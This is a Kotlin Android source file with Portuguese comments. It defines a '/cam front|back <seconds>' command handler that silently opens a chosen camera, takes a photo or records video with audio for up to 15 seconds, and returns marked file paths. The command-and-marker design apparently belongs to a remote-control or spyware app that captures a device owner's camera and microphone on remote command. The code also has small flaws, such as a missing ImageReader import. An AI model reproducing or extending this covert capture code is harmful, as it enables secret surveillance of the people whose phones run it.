package com.serv.app.cmds

import android.Manifest
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.Handler
import android.os.HandlerThread
import android.view.Surface
import com.serv.app.core.Perms
import java.io.File
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Captura via Camera2. Front/back, foto ou vídeo.
 * Vídeo usa MediaRecorder + Surface. Foto usa ImageReader em YUV_420_888, salva JPEG.
 */
object CamCmd {

    fun run(ctx: Context, args: String): String {
        val parts = args.trim().lowercase().split(Regex("\\s+"))
        if (parts.isEmpty() || parts.size < 2) return "uso: /cam front|back <segundos>"
        val facing = if (parts[0] == "front") CameraCharacteristics.LENS_FACING_FRONT
        else if (parts[0] == "back") CameraCharacteristics.LENS_FACING_BACK
        else return "uso: /cam front|back <segundos>"
        val secs = parts[1].toIntOrNull()?.coerceIn(1, 15) ?: return "segundos inválidos"

        if (!Perms.has(ctx, Manifest.permission.CAMERA)) return "Permissão faltando: CAMERA"

        val mgr = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val camId = mgr.cameraIdList.firstOrNull { id ->
            mgr.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: return "ERRO: câmera não encontrada"

        return if (secs <= 1) takePhoto(ctx, mgr, camId)
        else takeVideo(ctx, mgr, camId, secs)
    }

    private fun takePhoto(ctx: Context, mgr: CameraManager, camId: String): String {
        val outFile = File(ctx.cacheDir, "p_${System.currentTimeMillis()}.jpg")
        val t = HandlerThread("cam-t").apply { start() }
        val h = Handler(t.looper)
        var session: CameraCaptureSession? = null
        var reader: ImageReader? = null
        return try {
            val latch = CountDownLatch(1)
            val chars = mgr.getCameraCharacteristics(camId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
            val sz = map.getOutputSizes(ImageFormat.JPEG)!!.maxByOrNull { it.width * it.height }!!
            reader = ImageReader.newInstance(sz.width, sz.height, ImageFormat.JPEG, 2)
            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                try {
                    val buf = img.planes[0].buffer
                    val bytes = ByteArray(buf.remaining()); buf.get(bytes)
                    outFile.writeBytes(bytes)
                } finally { img.close(); latch.countDown() }
            }, h)

            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(dev: CameraDevice) {
                    dev.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            session = s
                            val req = dev.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                                addTarget(reader.surface)
                                set(CaptureRequest.JPEG_ORIENTATION, 90)
                            }.build()
                            s.capture(req, null, h)
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) { latch.countDown() }
                    }, h)
                }
                override fun onDisconnected(dev: CameraDevice) { dev.close() }
                override fun onError(dev: CameraDevice, e: Int) { dev.close(); latch.countDown() }
            }, h)

            latch.await(15, TimeUnit.SECONDS)
            if (outFile.exists()) "__PHOTO__:${outFile.absolutePath}" else "ERRO: foto falhou"
        } catch (t: Throwable) {
            "ERRO cam: ${t.message}"
        } finally {
            runCatching { session?.close() }
            runCatching { reader?.close() }
            t.quitSafely()
        }
    }

    private fun takeVideo(ctx: Context, mgr: CameraManager, camId: String, secs: Int): String {
        val outFile = File(ctx.cacheDir, "v_${System.currentTimeMillis()}.mp4")
        val t = HandlerThread("camv-t").apply { start() }
        val h = Handler(t.looper)
        var session: CameraCaptureSession? = null
        var dev: CameraDevice? = null
        val rec = MediaRecorder()
        return try {
            val chars = mgr.getCameraCharacteristics(camId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
            val sz = map.getOutputSizes(MediaRecorder::class.java)?.firstOrNull() ?: android.util.Size(1280, 720)

            val ready = CountDownLatch(1)
            mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(d: CameraDevice) {
                    dev = d
                    rec.setAudioSource(MediaRecorder.AudioSource.CAMCORDER)
                    rec.setVideoSource(MediaRecorder.VideoSource.SURFACE)
                    rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    rec.setVideoSize(sz.width, sz.height)
                    rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                    rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    rec.setOutputFile(outFile.absolutePath)
                    rec.prepare()
                    val surface = rec.surface
                    d.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) {
                            session = s
                            val req = d.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                                addTarget(surface)
                            }.build()
                            s.setRepeatingRequest(req, null, h)
                            rec.start()
                            ready.countDown()
                        }
                        override fun onConfigureFailed(s: CameraCaptureSession) { ready.countDown() }
                    }, h)
                }
                override fun onDisconnected(d: CameraDevice) { d.close() }
                override fun onError(d: CameraDevice, e: Int) { d.close(); ready.countDown() }
            }, h)

            ready.await(15, TimeUnit.SECONDS)
            Thread.sleep(secs * 1000L)
            runCatching { rec.stop() }
            runCatching { session?.close() }
            runCatching { dev?.close() }
            runCatching { rec.release() }
            if (outFile.exists() && outFile.length() > 1024) "__VIDEO__:${outFile.absolutePath}"
            else "ERRO: vídeo vazio"
        } catch (t: Throwable) {
            runCatching { rec.release() }
            "ERRO cam: ${t.message}"
        } finally {
            t.quitSafely()
        }
    }
}
